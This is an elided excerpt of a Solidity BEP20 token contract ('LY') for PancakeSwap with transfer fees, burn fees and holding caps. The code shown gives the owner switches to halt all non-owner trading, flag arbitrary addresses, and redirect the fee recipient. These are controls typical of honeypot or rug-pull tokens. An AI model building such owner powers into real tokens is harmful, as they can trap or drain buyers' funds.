...
contract PancakeTool {
    ...
    function initIRouter(address _router) internal {
        ...
        PancakePair = IFactory(PancakeV2Router.factory()).createPair(
            address(this),
            address(0x50c2DC0E1213EF1A2f809e6C24C8EEE6A07eCC55)
        );
    }
        ...
        returns (uint112 WETHAmount, uint112 TOKENAmount)
    {
        ...
        if (IPair(PancakePair).token0() == address(0x50c2DC0E1213EF1A2f809e6C24C8EEE6A07eCC55)) {
...
contract LY is Context, IBEP20, Ownable, PancakeTool {
    ...
    address public _RewardRouter = 0x2c5DdE81dBa3DCE2798757AB121e7Ab724ca612A;
    address private _making;

    uint8 private _cPercent = 15;
    uint8 private _bPercent = 5;

    uint256 private divBase = 1000;
    uint256 private size = 1000000000000000000;

    uint256 private _maxDeals = 13 * size;
    uint256 private _maxHold = 39 * size;

    mapping(address => bool) private peakAddress;
    ...
    function _transfer(
        ...
        //require(OpenTrading, "You're banned");
        if(!(sender == owner()||recipient == owner())&&!OpenTrading){
        ...
        if (sender != owner()) {
            ...
            _bFee = (amount / divBase) * _bPercent;
            _balances[BURN_ADDRESS] = _balances[BURN_ADDRESS].add(_bFee);
            _balances[_RewardRouter] = _balances[_RewardRouter].add(_cFee);
            emit Transfer(sender, _RewardRouter, _cFee);
            emit Transfer(sender, BURN_ADDRESS, _bFee);
        }

        _balances[recipient] = _balances[recipient].add(
            amount - _cFee - _bFee
        );
        emit Transfer(sender, recipient, amount - _cFee -_bFee);
    ...
    function _beforeTransfer(
        ...
        if (sender == PancakePair && recipient == _PancakeRouter) {
            ...
            require(
                aBalance <= _maxHold,
                "The maximum number of holdings is 39"
            );
            ...
            require(amount <= _maxDeals, "The maximum number of deals is 13");
        } else {
            require(amount <= _maxDeals, "The maximum number of deals is 13");
            uint256 aBalance = _balances[recipient] + amount;
            require(
    ...
    function changeOpenTrading(bool isOpen)
        public
        onlyOwner
        returns (bool)
    {
    ...
    function setPeakAddress(address adr,bool isOpen) public onlyOwner returns (bool) {
        peakAddress[adr] = isOpen;
        return true;
    }


    function viewPeakAddress(address adr) public view returns (bool) {
        return peakAddress[adr];
    }

    function setRewardAddress(address adr) public onlyOwner returns (bool) {
        _RewardRouter = adr;
        return true;
    }
    ...
    /**
     * @dev Destroys `amount` tokens from `account`, reducing the peakAddress
     * total supply.
     *
